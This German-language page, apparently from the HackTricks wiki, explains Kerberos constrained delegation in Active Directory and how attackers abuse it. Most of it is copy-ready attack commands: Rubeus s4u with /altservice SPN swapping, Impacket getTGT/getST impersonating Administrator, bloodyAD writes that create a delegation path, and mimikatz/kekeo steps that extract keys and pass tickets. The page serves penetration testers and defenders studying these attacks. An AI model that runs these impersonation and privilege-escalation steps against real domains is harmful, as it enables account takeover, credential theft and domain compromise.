# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Damit kann ein Domain admin einem Computer **erlauben**, sich **als Benutzer oder Computer auszugeben** gegenüber jedem **Service** einer Maschine.

- **Service for User to self (_S4U2self_):** Wenn ein **service account** einen _userAccountControl_-Wert hat, der [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) enthält, dann kann er ein TGS für sich selbst (den Service) im Auftrag eines beliebigen anderen Benutzers erhalten.
- **Service for User to Proxy(_S4U2proxy_):** Ein **service account** könnte ein TGS im Auftrag eines beliebigen Benutzers für den in **msDS-AllowedToDelegateTo** gesetzten Service erhalten. Dazu benötigt er zuerst ein TGS von diesem Benutzer an sich selbst, kann aber S4U2self nutzen, um dieses TGS vor dem Anfordern des anderen zu beschaffen.

**Hinweis**: Wenn ein Benutzer in AD als ‘_Account is sensitive and cannot be delegated_’ markiert ist, werden Sie ihn **nicht impersonieren können**.

Das bedeutet, dass wenn Sie **den Hash des Services kompromittieren** Sie **Benutzer impersonieren** und im Auftrag dieser **Zugriff** auf jeden **Service** der angegebenen Maschinen erhalten können (möglicher **privesc**).

Außerdem haben Sie **nicht nur Zugriff auf den Service, den der Benutzer impersonieren kann, sondern auch auf jeden anderen Service**, weil der SPN (der angeforderte Service-Name) nicht überprüft wird (in dem Ticket ist dieser Teil nicht verschlüsselt/signiert). Daher, wenn Sie Zugriff auf den **CIFS service** haben, können Sie z. B. mit dem `/altservice`-Flag in Rubeus auch Zugriff auf den **HOST service** erhalten. Dieselbe SPN-Swapping-Schwäche wird von **Impacket getST -altservice** und anderen Tools ausgenutzt.

Außerdem ist **LDAP service access on DC** das, was benötigt wird, um einen **DCSync** auszunutzen.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Hinweise zu Cross-domain constrained delegation (2025+)

Seit **Windows Server 2012/2012 R2** unterstützt der KDC **constrained delegation across domains/forests** über S4U2Proxy-Erweiterungen. Moderne Builds (Windows Server 2016–2025) behalten dieses Verhalten bei und fügen zwei PAC-SIDs hinzu, um einen protocol transition zu signalisieren:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wenn sich der Benutzer normal authentifiziert hat.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wenn ein Dienst die Identität durch protocol transition behauptet hat.

Erwarte `SERVICE_ASSERTED_IDENTITY` im PAC, wenn protocol transition domänenübergreifend verwendet wird; dies bestätigt, dass der S4U2Proxy-Schritt erfolgreich war.

### Impacket / Linux-Tools (altservice & full S4U)

Neuere Impacket-Versionen (0.11.x+) bieten dieselbe S4U-Kette und SPN swapping wie Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Wenn du es vorziehst, zuerst das Benutzer-ST zu fälschen (z. B. nur Offline-Hash), kombiniere **ticketer.py** mit **getST.py** für S4U2Proxy. Siehe das offene Impacket-Issue #1713 für aktuelle Eigenheiten (KRB_AP_ERR_MODIFIED, wenn das gefälschte ST nicht mit dem SPN key übereinstimmt).

### Delegierungseinrichtung von low-priv creds automatisieren

Wenn du bereits **GenericAll/WriteDACL** über ein Computer- oder Servicekonto besitzt, kannst du die erforderlichen Attribute aus der Ferne ohne RSAT mit **bloodyAD** (2024+) setzen:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Das ermöglicht dir, einen constrained delegation-Pfad für privesc ohne DA privileges aufzubauen, sobald du diese Attribute schreiben kannst.

- Schritt 1: **Erhalte TGT des erlaubten Dienstes**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Es gibt **andere Wege, ein TGT ticket zu erhalten** oder den **RC4**- oder **AES256**-Schlüssel zu bekommen, ohne auf dem Computer SYSTEM zu sein, wie z. B. den Printer Bug, unconstrain delegation, NTLM relaying und Active Directory Certificate Service abuse
>
> **Allein mit diesem TGT ticket (or hashed) kannst du diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**

- Schritt 2: **Hole TGS für den Dienst, indem du dich als Benutzer ausgibst**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Mehr Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) und [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Referenzen
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
